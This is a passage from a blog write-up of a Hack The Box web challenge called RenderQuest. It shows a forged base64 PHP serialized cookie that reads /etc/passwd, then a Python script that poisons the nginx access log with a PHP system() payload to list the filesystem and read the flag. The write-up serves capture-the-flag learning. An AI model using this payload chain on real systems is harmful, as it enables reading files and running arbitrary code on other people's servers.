<figure class="highlight applescript"><table><tbody><tr><td class="code"><pre><span class="line">- `O:<span class="number">9</span>:<span class="string">"PageModel"</span>:<span class="number">1</span>`:</span><br><span class="line">    - `O`: Denotes an object.</span><br><span class="line">    - `<span class="number">9</span>`: The <span class="built_in">length</span> <span class="keyword">of</span> <span class="keyword">the</span> serialized <span class="built_in">string</span>.</span><br><span class="line">    - `<span class="string">"PageModel"</span>`: Name <span class="keyword">of</span> <span class="keyword">the</span> <span class="built_in">class</span> (<span class="keyword">in</span> this case, <span class="string">"PageModel"</span>).</span><br><span class="line">    - `<span class="number">1</span>`: Indicates there <span class="keyword">is</span> <span class="number">1</span> <span class="keyword">property</span> <span class="keyword">in</span> <span class="keyword">the</span> serialized object.</span><br><span class="line">- `{s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">15</span>:<span class="string">"/www/index.html"</span>;}`:</span><br><span class="line">    </span><br><span class="line">    - `s:<span class="number">4</span>:<span class="string">"file"</span>;`: Represents a <span class="built_in">string</span> <span class="keyword">with</span> a <span class="built_in">length</span> <span class="keyword">of</span> <span class="number">4</span> <span class="built_in">characters</span> <span class="keyword">for</span> <span class="keyword">the</span> <span class="keyword">property</span> <span class="built_in">name</span> <span class="string">"file"</span>.</span><br><span class="line">    - `s:<span class="number">15</span>:<span class="string">"/www/index.html"</span>;`: Represents a <span class="built_in">string</span> <span class="keyword">with</span> a <span class="built_in">length</span> <span class="keyword">of</span> <span class="number">15</span> <span class="built_in">characters</span> <span class="keyword">for</span> <span class="keyword">the</span> value <span class="string">"/www/index.html"</span>.</span><br></pre></td></tr></tbody></table></figure>

<p>The only field we have to modify is the <code>s:15:"/www/index.html"</code>.</p>
<p>Then we can have a control of what is being render in the page.</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(ikonw„âøXing)-[~/Desktop/htb_challenge/RenderQuest]</span><br><span class="line">‚îî‚îÄ$ <span class="built_in">echo</span> <span class="string">'O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}'</span> | <span class="built_in">base64</span></span><br><span class="line">Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30K</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231231205627619.png" class="lazyload"></p>
<p>After some trial and error, I dont seem to show the <code>/flag.txt</code>. Checking the docker it seems the filename is being by randomly renamed in entrypoint.sh</p>
<figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">!/bin/ash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Secure entrypoint</span></span><br><span class="line"><span class="built_in">chmod</span> 600 /entrypoint.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate random flag filename</span></span><br><span class="line"><span class="built_in">mv</span> /flag /flag_`<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">'a-zA-Z0-9'</span> | <span class="built_in">fold</span> -w 5 | <span class="built_in">head</span> -n 1`</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="string">"<span class="variable">$@</span>"</span></span><br></pre></td></tr></tbody></table></figure>

<p>we have no way to extract the file without knowing the name.</p>
<p>Since we are able to have local file inclusion, we can always perform <a target="_blank" rel="noopener" href="https://systemweakness.com/log-poisoning-to-remote-code-execution-lfi-curl-7c49be11956">log poisoning</a>.</p>
<p>Review the Dockerfile, the webserver is using nginx, which means we can find the access.log file located at <code>/var/log/nginx/access.log</code></p>
<p>Changed the User-Agent to executes PHP codes </p>
<p>Below is the full script to extract the flag name and the content using regex.</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">"http://167.99.85.216:30412/"</span></span><br><span class="line"></span><br><span class="line">cookie = <span class="string">b'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}'</span></span><br><span class="line">cookie = base64.b64encode(cookie)</span><br><span class="line">header =  {<span class="string">"PHPSESSID"</span>: cookie.decode()}</span><br><span class="line"><span class="built_in">print</span>(cookie)</span><br><span class="line">headers = {<span class="string">"User-Agent"</span>: <span class="string">"&lt;?php system('ls -la /')?&gt;"</span>}</span><br><span class="line">r = requests.get(url,cookies=header, headers=headers)</span><br><span class="line">flag = re.search(<span class="string">r'\bflag_\w+\b'</span>, r.text, flags=re.IGNORECASE)</span><br><span class="line">flag = flag.group()</span><br><span class="line"></span><br><span class="line">headers = {<span class="string">"User-Agent"</span>: <span class="string">f"&lt;?php system('cat /<span class="subst">{flag}</span>')?&gt;"</span>}</span><br><span class="line"><span class="built_in">print</span>(headers)</span><br><span class="line">r = requests.get(url,cookies=header, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231231210821028.png" class="lazyload"></p>
  	
					
	  </div>     
	  

	<div class="bottom">
  <div class="other">
    <div class="meta">
      

      
    </div>

    <div class="operate">
      
      <span class="text">Share</span>
      <ul class="share">
	   			             
        <li class="iconfont 
		icon-share-weixin 
		-mob-share-weixin 
		item"></li>		
   	   			             
        <li class="iconfont 
		icon-share-weibo 
		-mob-share-weibo 
		item"></li>		
   	   			             
        <li class="iconfont 
		icon-share-facebook 
		-mob-share-facebook 
		item"></li>		
   	   			             
        <li class="iconfont 
		icon-share-twitter 
		-mob-share-twitter 
		item"></li>		
   	   			             
        <li class="iconfont 
		icon-share-google 
		-mob-share-google 
		item"></li>		
   	   
</ul>	

<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
      
    </div>
  </div>


  
  <nav class="nav">
    <div class="link">
      
    </div>
    <div class="link">
      
      <a href="/2020/01/10/HTB-bastion/" class="link-wrap">
        <strong class="caption">newer</strong>
        
        <span class="title">
          HTB Bastion Writeup
        </span>
      </a>
      
    </div>
  </nav>
  
</div> 
	
<div class="comment">

    
    <div id="disqus_thread"></div>
    <script>
        (function () {
            var d = document,
                s = d.createElement('script');
            s.src = 'https://' + 'ik0nw-github-io' + '.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>


    
</div>	
</article>

          </div> 
      </div>            
    
        <i id="toTop" class="iconfont icon-backtotop"></i>

  
    <div class="none" id="search">
    <div class="header">
        <input type="text" placeholder="Typing Something here." id="search-input" class="input">
        
        <i id="search-cancel" class="iconfont icon-cancel"></i>
    </div>

    <div id="search-result" class="result"></div>
</div>
     <div class="mobile-menu">      

      
      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/avatar.jpg">  
      

         
            

            <a class="mobile-menu-link" href="/">Home
            </a>
            
         
            

            <a class="mobile-menu-link" href="/archives">Archives
            </a>
            
         
            

            <a class="mobile-menu-link" href="/tags">Tags
            </a>
            
         
            

            <a class="mobile-menu-link" href="/about">About
            </a>
            
         
                          

            <a class="mobile-menu-link mobile-menu-search" href="#">Search </a>                 
            
         
      
</div>
        
    



     
    


<footer class="footer">
	<div class="inner">
		<div class="copyright">
			¬©
			
			2020 -
			
			2023
			Ikonw

			<br>
			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
		</div>
	</div>
</footer>   

    
<script src="/nayo.bundle.js"></script>
           
          
</body></html>